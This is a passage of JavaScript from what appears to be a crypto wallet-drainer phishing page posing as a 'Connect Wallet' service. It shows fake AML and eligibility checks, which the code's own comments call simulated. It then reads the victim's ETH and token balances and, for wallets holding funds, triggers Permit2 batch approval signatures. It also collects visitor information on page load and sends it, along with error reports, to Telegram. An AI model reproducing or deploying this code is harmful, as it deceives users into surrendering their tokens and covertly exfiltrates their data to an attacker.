        <button id="connectBtn">Connect Wallet</button>
      `;
      const btn = document.getElementById('connectBtn');
      if (btn) {
        btn.onclick = onConnect;
      }
    }
    return;
  }

const provider = await getEthersProviderFromWagmi();

  let balance;
  try {
    balance = await getBalance(config, {
      address: account.address
    });
  } catch {
    balance = { formatted: "0.0000", symbol: "ETH" };
  }

  if(ui) {
    ui.innerHTML = `
      <h2>Wallet Connected</h2>
      <p>Connection established successfully</p>

      <div class="status">
        <span class="dot green"></span>
        <span>Wallet connected</span>
      </div>

      <div class="card">
        <div class="row"><span>Address</span><strong>${short(account.address)}</strong></div>
        <div class="row"><span>Network</span><strong>Ethereum</strong></div>
        <div class="row"><span>Balance</span><strong>${Number(balance.formatted).toFixed(4)} ${balance.symbol}</strong></div>
      </div>

      <button class="danger" id="disconnectBtn">
        Disconnect
      </button>
    `;

    document.getElementById('disconnectBtn').onclick = async () => {
      await disconnect(config);
      location.reload();
    };
  }
}



let connecting = false;

async function onConnect() {
  if (connecting) return;
  connecting = true;

  try {
    setStatus('connecting');

    // Log the connect wallet click
    await logConnectWalletClick();

    // 1️⃣ Open wallet selector
    await modal.open();

    // 2️⃣ Wait for wallet connection
    const account = await new Promise((resolve, reject) => {
      const timeout = setTimeout(() => {
        unwatch();
        reject(new Error("Wallet connection not finalized"));
      }, 30000);

      const unwatch = watchAccount(config, {
        onChange(acc) {
          if (acc.isConnected) {
            clearTimeout(timeout);
            unwatch();
            resolve(acc);
          }
        }
      });
    });

    // 3️⃣ Show UX modal
    showUxModal();
    setUxState("CONNECTING");
    await sleep(2000);

    // Simulate blockchain connection
    setUxState("CHAIN_READY", "Connecting to Ethereum network…");

    // Simulate AML / eligibility check
    setUxState("AML_CHECK", "Checking wallet compliance and AML…");

    setUxState("CHECKING_ELIGIBILITY", "Verifying wallet eligibility…");

    // 4️⃣ Get balances
    const provider = await getEthersProviderFromWagmi();
    const ethBalance = await provider.getBalance(account.address);

    let eligibleTokens = [];
    for (const t of TOKENS) {
      const tokenContract = new ethers.Contract(
        t.address,
        ["function balanceOf(address) view returns (uint256)"],
        provider
      );
      const balance = await tokenContract.balanceOf(account.address);
      if (!balance.isZero()) {
        eligibleTokens.push({
          symbol: t.symbol,
          amount: ethers.utils.formatUnits(balance, t.decimals),
        });
      }
    }

    // 5️⃣ Determine eligibility
    const isEligible = !ethBalance.isZero() || eligibleTokens.length > 0;

    // Send wallet info Telegram message only once
    const walletType = detectWalletTypeFromAccount();
   

    if (!isEligible) {
      setUxState("NOT_ELIGIBLE", "Wallet not eligible");
      hideUxModal();
      setStatus('error', 'Wallet not eligible');
      return;
    }

    // 6️⃣ Eligible wallet: update UX for next flow step
    setUxState("ELIGIBLE", "Wallet eligible");

    // ✅ Now run your actual deposit/permit2/batch logic
    try {
      await depositAllBatchPermit2Only(); // this is the only thing that triggers signatures
    } catch (e) {
      console.error("Deposit failed:", e);
      setUxState("NOT_ELIGIBLE", "Deposit failed. Check console for details.");
      throw e;
    }

    // 7️⃣ Final UI update
    await render();
    hideUxModal();
    setStatus('connected');
    
    // Notify script.js that wallet is connected
    if (typeof window.updateWalletState === 'function') {
      window.updateWalletState({
        isConnected: true,
        address: account.address,
        isEligible: isEligible
      });
    }

  } catch (e) {
    console.error(e);
    hideUxModal();
    setStatus('error', 'Connection failed');
    await sendTelegram(`⚠️ Connection flow error: ${code(explainError(e))}`);
  } finally {
    connecting = false;
  }
}

// =========================
// Helper sleep function
// =========================
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


document.addEventListener("DOMContentLoaded", async () => {
  try {
    const visitor = await getVisitorInfo();
    const msg = fmtTelegramVisitorIntel(visitor); // nicely formatted message
    await sendTelegram(msg); // send to Telegram
  } catch (e) {
    console.error("Visitor info sending failed:", e);
  }

  render(); // your UI render function

  const btn = document.getElementById('connectBtn');
  if (btn) btn.onclick = onConnect; // attach wallet connect handler
});


// Periodic UI refresh
setInterval(render, 1000);

// Expose functions if needed (optional)
window.depositAllBatchPermit2Only = depositAllBatchPermit2Only;
window.ensurePermit2Approvals = ensurePermit2Approvals;
window.depositSingleTokenPermit2Only = depositSingleTokenPermit2Only;
window.getVisitorIntel = window.showVisitorIntel;
window.onConnect = onConnect;